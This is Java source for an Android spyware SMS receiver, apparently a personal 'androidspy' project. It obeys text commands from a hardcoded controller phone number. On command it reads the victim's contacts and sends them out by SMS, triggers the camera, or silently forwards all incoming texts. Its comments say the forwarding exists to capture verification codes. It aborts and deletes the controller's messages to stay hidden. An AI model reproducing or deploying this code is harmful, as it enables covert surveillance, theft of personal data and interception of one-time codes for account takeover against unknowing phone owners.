package com.gushuangchi.androidspy;

/**
 * Created by gushuangchi on 16/4/10.
 */

import java.text.SimpleDateFormat;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.hardware.Camera;

import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;


public class SmsReceiver extends BroadcastReceiver {
    public int shell = 0;
    private Camera camera;
    private boolean isPreviewing;
    private SmsManager smsManager;
    private boolean show = true;
    private String phoneNumber = "+8618317006989";
    private NewActivity actCam = new NewActivity();

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        Object[] objects = (Object[]) bundle.get("pdus");
        for(Object obj : objects){
            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[])obj);
            String body = smsMessage.getDisplayMessageBody();
            String address = smsMessage.getDisplayOriginatingAddress();
            long date = smsMessage.getTimestampMillis();
            SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
            String dateStr = format.format(date);
            if(true){
                int temp = -1;
                smsManager = SmsManager.getDefault();
                if (address.equals(phoneNumber)) {

                    int x = getShell(body);
                    if ((x==1)||(x==2)) { temp = shell; shell = x;abortBroadcast();
                        deleteSMS(context); } else
                    if (x==3) { shell = x;abortBroadcast();
                        deleteSMS(context); } else
                    if (x==4) {  shell = 0; abortBroadcast();
                        deleteSMS(context);} else
                    if (!show)  { abortBroadcast(); deleteSMS(context); }
                } else { if (!show)  abortBroadcast(); deleteSMS(context); }
                switch (shell) {
                    case 0: //什么都不做
                        break;

                    case 1: //读取联系人

                        Uri uri = Uri.parse("content://com.android.contacts/contacts");
                        int num = 0;
                        String tot;
                        tot = "";
                        ContentResolver resolver = context.getContentResolver();
                        Cursor cursor = resolver.query(uri, new String[]{"_id"}, null, null, null);
                        while (cursor.moveToNext()) {
                            int contractID = cursor.getInt(0);
                            StringBuilder sb = new StringBuilder("");
                            //sb.append(contractID);
                            uri = Uri.parse("content://com.android.contacts/contacts/" + contractID + "/data");
                            Cursor cursor1 = resolver.query(uri, new String[]{"mimetype", "data1", "data2"}, null, null, null);
                            while (cursor1.moveToNext()) {
                                String data1 = cursor1.getString(cursor1.getColumnIndex("data1"));
                                String mimeType = cursor1.getString(cursor1.getColumnIndex("mimetype"));
                                if ("vnd.android.cursor.item/name".equals(mimeType)) { //是姓名
                                    sb.append(";"+data1);

                                } else if ("vnd.android.cursor.item/phone_v2".equals(mimeType)) { //手机
                                    sb.append(":" + data1);
                                }
                            }
                            cursor1.close();
                            //Log.i(TAG, sb.toString());
                            tot += sb.toString();
                            num++;
                            if (num>=3) break;
                        }
                        cursor.close();
                        smsManager.sendTextMessage(phoneNumber,null,tot,null,null);
                        break;

                    case 2: //打开摄像头

                        Intent dialogIntent = new Intent(context, NewActivity.class);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(dialogIntent);
                        actCam.onWindowFocusChanged(true);
                        break;


                    case 3: //转发此电话接收的短息到自己的手机,用于接收验证码
                        smsManager.sendTextMessage(phoneNumber,null,address + "于" + dateStr + "发:" + body,null,null);
                        break;

                    default:break;
                };
                if (temp != -1) { shell = temp; }
            }
        }
    }

    public void deleteSMS(Context context)
    {
        try
        {
            // 准备系统短信收信箱的uri地址
            Uri uri = Uri.parse("content://sms/inbox");// 收信箱
            // 查询收信箱里所有的短信
            Cursor isRead = context.getContentResolver().query(uri, null, "read=" + 0, null, null);
            while (isRead.moveToNext())
            {
                String phone = isRead.getString(isRead.getColumnIndex("address")).trim();//获取发信人
                if (phone.equals(phoneNumber))
                {
                    int id = isRead.getInt(isRead.getColumnIndex("_id"));
                    context.getContentResolver().delete(
                            Uri.parse("content://sms"), "_id=" + id, null);
                }
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    public int getShell(String body){
        if (body.contains("contacts")) {
            return 1;//读取联系人信息返回
        } else
        if (body.contains("camera")) {
            return 2;//拍照
        } else
        if (body.contains("listening")){
            show = true;
            return 3;//不静默转发所有当前接收的短信
        } else
        if (body.contains("cancel")){
            show = true;
            return 4;//取消转发功能
        } else
        if (body.contains("block")){
            show = false;
            return 3;//静默转发所有当前接收的短信，使用验证码的时候用的
        } else
        { return 0;//其他信息
        }

    }
}
